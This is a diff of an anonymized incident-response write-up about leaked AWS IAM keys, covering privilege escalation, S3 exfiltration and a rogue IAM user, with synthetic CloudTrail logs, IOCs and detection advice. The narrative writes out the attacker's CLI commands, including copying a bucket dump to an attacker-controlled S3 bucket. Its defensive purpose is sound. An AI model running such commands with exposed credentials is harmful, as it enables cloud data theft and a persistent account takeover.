@@ -1,15 +1,15 @@
-# 🛡 Demo Case: AWS IAM Key Abuse & S3 Exfiltration (Anonymized)
+🛡 AWS IAM Key Abuse & S3 Exfiltration (Anonymized)
+📌 Executive Summary
 
-## 📌 Executive Summary
-This case describes an **AWS cloud breach** where exposed IAM access keys were abused.  
-The attacker enumerated the environment, escalated privileges by attaching new policies, and exfiltrated data from S3 buckets.  
-Persistence was achieved via creation of a new IAM user with admin rights.  
+This case describes an AWS cloud breach where exposed IAM access keys were abused.
+The attacker enumerated the environment, escalated privileges by attaching new policies, and exfiltrated data from S3 buckets.
+Persistence was achieved via creation of a new IAM user with admin rights.
 
-**🎯 Outcome:** confirmed cloud credential theft, privilege escalation, data exfiltration, and persistence.
+🎯 Outcome: confirmed cloud credential theft, privilege escalation, data exfiltration, and persistence.
 
----
+___________________________________________________________________________________________________________________________________________________________________
 
-## 🖼 Attack Flow (ASCII Diagram)
+🖼 Attack Flow (ASCII Diagram)
 
 +--------------------------+
 | External Attacker        |
@@ -47,67 +47,166 @@ Persistence was achieved via creation of a new IAM user with admin rights.
 | New IAM User Created     |
 +--------------------------+
 
----
+___________________________________________________________________________________________________________________________________________________________________
 
-## 📖 Attack Narrative
+📖 Attack Narrative
+---------------------------------------------------------------------------------------------
+Stage 1 – Initial Access
 
-### Stage 1 – Initial Access
-- 🔴 Exposed IAM access keys harvested from GitHub repo.  
-- 🟡 Used **AWS STS AssumeRole** to authenticate.  
+🔴 Exposed IAM keys discovered on GitHub.
 
-### Stage 2 – Reconnaissance
-- 🔴 Enumerated resources with `aws s3 ls`, `aws ec2 describe-instances`.  
-- 🟡 Identified sensitive S3 buckets containing logs & customer data.  
+🟡 Used aws sts assume-role --role-arn arn:aws:iam::<victim>:role/app to authenticate.
 
-### Stage 3 – Privilege Escalation
-- 🔴 Attacker called `AttachUserPolicy` to grant **AdministratorAccess**.  
+---------------------------------------------------------------------------------------------
+Stage 2 – Reconnaissance
 
-### Stage 4 – Exfiltration & Persistence
-- 🔴 Ran `aws s3 sync s3://sensitive-bucket ./dump` → copied externally.  
-- 🟡 Created new IAM user `sys-backup` with admin rights for persistence.  
+🔴 Enumerated S3 buckets with aws s3 ls.
 
----
+🟡 Queried EC2 inventory: aws ec2 describe-instances.
 
-## ⏱️ Timeline (UTC)
+🟡 Identified sensitive-bucket with PII and logs.
 
-| Time   | Event                                               |
-|--------|-----------------------------------------------------|
-| 14:02  | 🔴 IAM keys leaked & attacker authenticated         |
-| 14:15  | 🟡 Recon: `aws s3 ls` + `describe-instances`         |
-| 14:30  | 🔴 Privilege escalation: `AttachUserPolicy` → Admin  |
-| 14:50  | 🔴 Exfiltration: S3 sync executed                    |
-| 15:05  | 🟡 New IAM user `sys-backup` created (persistence)   |
+---------------------------------------------------------------------------------------------
+Stage 3 – Privilege Escalation
 
----
+🔴 Called AttachUserPolicy → added AdministratorAccess to self.
 
-## 🔑 Key Findings
-- IAM keys exposed in public repo → attacker gained entry.  
-- Privilege escalation via policy attachment allowed full control.  
-- Data exfiltrated from S3 within 1 hour of compromise.  
-- Persistence maintained by creating rogue IAM user.  
+---------------------------------------------------------------------------------------------
+Stage 4 – Exfiltration & Persistence
 
----
+🔴 Ran:
 
-## 🗂️ MITRE ATT&CK Mapping
-- **T1078.004 – Valid Accounts: Cloud Accounts**  
-- **T1087 – Account Discovery (Cloud)**  
-- **T1485 – Data Destruction / Exfiltration (S3 sync)**  
-- **T1136.003 – Create Account (IAM User)**  
-- **T1098 – Account Manipulation (Policy Attachment)**  
+aws s3 sync s3://sensitive-bucket ./dump
+aws s3 cp ./dump attacker-s3-bucket --recursive
 
----
 
-## 👀 Detection Use Cases
-- 🚨 Alert on IAM keys used from new geographies.  
-- Detect `AttachUserPolicy` granting **Admin** rights.  
-- Monitor large-volume `aws s3 sync` or `GetObject` calls.  
-- Watch for creation of new IAM users by non-admin roles.  
+🟡 Created new IAM user sys-backup + API key → persistence.
 
----
+___________________________________________________________________________________________________________________________________________________________________
 
-## 🛡️ Recommendations
-- Enforce IAM key rotation & use short-lived credentials.  
-- Block IAM policy modifications outside change windows.  
-- Monitor S3 access patterns & enable GuardDuty.  
-- Enforce least-privilege IAM policies & MFA for console access.  
-- Automate detection of exposed keys in public repos (e.g., GitHub). 
+⏱️ Timeline (UTC)
+
+| Time  | Event                                               |
+| ----- | --------------------------------------------------- |
+| 14:02 | 🔴 IAM keys leaked & attacker authenticated         |
+| 14:15 | 🟡 Recon: `aws s3 ls` + `describe-instances`        |
+| 14:30 | 🔴 Privilege escalation: `AttachUserPolicy` → Admin |
+| 14:50 | 🔴 Exfiltration: S3 sync executed (2.3 GB)          |
+| 15:05 | 🟡 New IAM user `sys-backup` created (persistence)  |
+
+___________________________________________________________________________________________________________________________________________________________________
+
+📂 CloudTrail Artifacts (Synthetic)
+
+---------------------------------------------------------------------------------------------
+STS Authentication
+
+{
+  "eventTime": "2025-07-21T14:02:12Z",
+  "eventSource": "sts.amazonaws.com",
+  "eventName": "AssumeRole",
+  "userAgent": "aws-cli/2.12",
+  "sourceIPAddress": "185.220.101.45",
+  "requestParameters": { "roleArn": "arn:aws:iam::111111111111:role/app" },
+  "responseElements": { "assumedRoleUser": "AttackerSession" }
+}
+
+---------------------------------------------------------------------------------------------
+Privilege Escalation
+
+{
+  "eventTime": "2025-07-21T14:30:02Z",
+  "eventSource": "iam.amazonaws.com",
+  "eventName": "AttachUserPolicy",
+  "requestParameters": {
+    "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess",
+    "userName": "legacy-app"
+  }
+}
+
+---------------------------------------------------------------------------------------------
+S3 Exfiltration
+
+{
+  "eventTime": "2025-07-21T14:50:37Z",
+  "eventSource": "s3.amazonaws.com",
+  "eventName": "GetObject",
+  "requestParameters": { "bucketName": "sensitive-bucket", "key": "*" },
+  "bytesTransferred": "2380000000",
+  "sourceIPAddress": "185.220.101.45"
+}
+
+---------------------------------------------------------------------------------------------
+Persistence
+
+{
+  "eventTime": "2025-07-21T15:05:07Z",
+  "eventSource": "iam.amazonaws.com",
+  "eventName": "CreateUser",
+  "requestParameters": { "userName": "sys-backup" },
+  "userAgent": "aws-cli/2.12"
+}
+
+___________________________________________________________________________________________________________________________________________________________________
+
+🧾 IOCs
+
+| Type       | Value                              | Status         |
+| ---------- | ---------------------------------- | -------------- |
+| IP Address | `185.220.101.45`                   | Attacker infra |
+| User       | `legacy-app` (compromised)         | Abused         |
+| User       | `sys-backup` (created by attacker) | Rogue          |
+| Policy     | `AdministratorAccess`              | Misused        |
+| Bucket     | `sensitive-bucket`                 | Exfiltrated    |
+
+___________________________________________________________________________________________________________________________________________________________________
+
+🔑 Key Findings
+
+IAM keys exposed publicly → initial access.
+
+Attacker escalated by attaching Admin policy.
+
+S3 data (~2.3 GB) exfiltrated to attacker infra.
+
+Persistence via rogue IAM user creation.
+
+___________________________________________________________________________________________________________________________________________________________________
+
+🗂️ MITRE ATT&CK Mapping
+
+T1078.004 – Valid Accounts: Cloud Accounts
+
+T1087 – Account Discovery (Cloud)
+
+T1530 – Data Exfiltration from Cloud Storage
+
+T1136.003 – Create Account (IAM User)
+
+T1098 – Account Manipulation (Policy Attachment)
+
+___________________________________________________________________________________________________________________________________________________________________
+
+👀 Detection Use Cases
+
+🚨 Alert on IAM key usage from new geo/IP.
+
+🚨 Detect AttachUserPolicy with AdministratorAccess.
+
+🟡 Monitor high-volume S3 GetObject / s3 sync.
+
+🟡 Alert on new IAM user creation by non-admin apps.
+
+___________________________________________________________________________________________________________________________________________________________________
+
+🛡️ Recommendations
+
+Rotate & revoke IAM keys; prefer STS temp creds.
+
+Restrict iam:AttachUserPolicy to break-glass accounts.
+
+Enable GuardDuty + CloudTrail real-time alerts.
+
+Apply S3 bucket policies to block public access.
+
+Scan GitHub & CI/CD for accidental key leaks.
